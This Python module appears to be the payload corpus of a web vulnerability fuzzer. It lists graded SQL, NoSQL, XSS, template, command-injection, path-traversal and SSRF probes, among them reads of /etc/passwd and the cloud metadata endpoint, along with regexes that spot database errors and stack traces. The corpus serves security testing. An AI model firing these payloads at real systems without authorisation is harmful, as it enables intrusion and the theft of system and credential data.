"""Fuzz payload corpus. Level 1 = quick, 2 = default, 3 = adds SecLists if present."""
from __future__ import annotations

import os
from pathlib import Path
from typing import Dict, List

MARK = "gsa7x9"  # unique marker to detect reflection

PAYLOADS: Dict[str, List[tuple]] = {
    # (payload, level)
    "sqli": [
        ("'", 1), ("\"", 1), ("' OR '1'='1", 1), ("1 OR 1=1", 1), ("')--", 2), ("1;--", 2),
        ("' UNION SELECT NULL--", 2), ("1' AND SLEEP(5)-- -", 2), ("1'; SELECT pg_sleep(5)--", 2),
        ("1); WAITFOR DELAY '0:0:5'--", 3), ("admin'--", 2),
    ],
    "nosqli": [({"$ne": None}, 1), ({"$gt": ""}, 2), ("{\"$where\": \"sleep(5000)\"}", 3), ("[$ne]=1", 2)],
    "xss": [
        (f"<script>alert('{MARK}')</script>", 1), (f"\"><img src=x onerror=alert('{MARK}')>", 1),
        (f"<svg/onload=alert('{MARK}')>", 2), (f"javascript:alert('{MARK}')", 2), (f"'-alert('{MARK}')-'", 3),
    ],
    "ssti": [("{{1337*1337}}", 1), ("${1337*1337}", 1), ("<%= 1337*1337 %>", 2), ("#{1337*1337}", 2), ("{{7*'7'}}", 3)],
    "cmdi": [(";id", 1), ("|id", 2), ("$(id)", 2), ("`id`", 2), ("; sleep 5", 2), ("&& ping -c 5 127.0.0.1", 3)],
    "traversal": [("../../../../etc/passwd", 1), ("..%2f..%2f..%2f..%2fetc%2fpasswd", 2), ("....//....//....//etc/passwd", 2), ("..\\..\\..\\windows\\win.ini", 3)],
    "ssrf": [("http://169.254.169.254/latest/meta-data/", 2), ("http://127.0.0.1:22", 2), ("file:///etc/passwd", 2), ("http://[::1]/", 3)],
    "type": [(None, 1), (-1, 1), (0, 2), (99999999999999999999, 2), (True, 2), ([], 2), ({}, 2), ("NaN", 3), (1.5e308, 3)],
    "overflow": [("A" * 5000, 1), ("A" * 100000, 2), ("😀" * 2000, 2), ("‮" + "gsa", 2), ("\x00", 1), ("%00", 2), ("\r\nX-Injected: gsa", 2)],
    "format": [("%s%s%s%n", 2), ("{0}{1}", 3), ("../", 2)],
}

ERROR_SIGNATURES = [
    # SQL
    (r"SQL syntax.*MySQL|Warning.*mysql_|MySqlException|valid MySQL result|check the manual that corresponds to your (MySQL|MariaDB)", "MySQL error"),
    (r"PostgreSQL.*ERROR|PG::SyntaxError|psycopg2?\.(errors|ProgrammingError)|unterminated quoted string|syntax error at or near", "PostgreSQL error"),
    (r"sqlite3\.OperationalError|SQLite/JDBCDriver|SQLITE_ERROR|near \".*\": syntax error", "SQLite error"),
    (r"ORA-\d{5}|Oracle error", "Oracle error"),
    (r"Microsoft SQL Server|ODBC SQL Server Driver|Unclosed quotation mark", "MSSQL error"),
    (r"SequelizeDatabaseError|PrismaClientKnownRequestError|QueryFailedError|knex:", "ORM error"),
    (r"MongoError|MongoServerError|CastError|BSONTypeError", "MongoDB error"),
    # Stack traces / debug pages
    (r"Traceback \(most recent call last\)", "Python traceback"),
    (r"at [\w\.<>$]+ \([^)]*\.(js|ts):\d+:\d+\)", "Node.js stack trace"),
    (r"Exception in thread|java\.lang\.\w+Exception|at [\w\.$]+\([\w]+\.java:\d+\)", "Java stack trace"),
    (r"You're seeing this error because you have <code>DEBUG = True</code>|Django Version:", "Django debug page"),
    (r"Werkzeug Debugger|werkzeug\.exceptions", "Flask/Werkzeug debugger"),
    (r"ActionController::|ActiveRecord::\w+Error", "Rails error"),
    (r"Fatal error: |Parse error: |Stack trace:\s+#0", "PHP error"),
    (r"panic: |goroutine \d+ \[running\]", "Go panic"),
]

SECLISTS_FILES = [
    "Fuzzing/SQLi/Generic-SQLi.txt",
    "Fuzzing/XSS/human-friendly/XSS-Jhaddix.txt",
    "Fuzzing/command-injection-commix.txt",
    "Fuzzing/LFI/LFI-Jhaddix.txt",
]


def find_seclists() -> Path | None:
    for c in [os.environ.get("SECLISTS"), "~/SecLists", "/usr/share/seclists", "/opt/SecLists", "/usr/share/wordlists/seclists"]:
        if c and Path(c).expanduser().is_dir():
            return Path(c).expanduser()
    return None


def get_payloads(level: int, per_file: int = 40) -> Dict[str, list]:
    out = {cat: [p for p, lv in items if lv <= level] for cat, items in PAYLOADS.items()}
    if level >= 3:
        sl = find_seclists()
        if sl:
            for rp in SECLISTS_FILES:
                f = sl / rp
                if f.exists():
                    cat = "seclists:" + f.stem
                    lines = [l.rstrip("\n") for l in f.read_text(errors="ignore").splitlines() if l.strip() and not l.startswith("#")]
                    out[cat] = lines[:per_file]
    return out
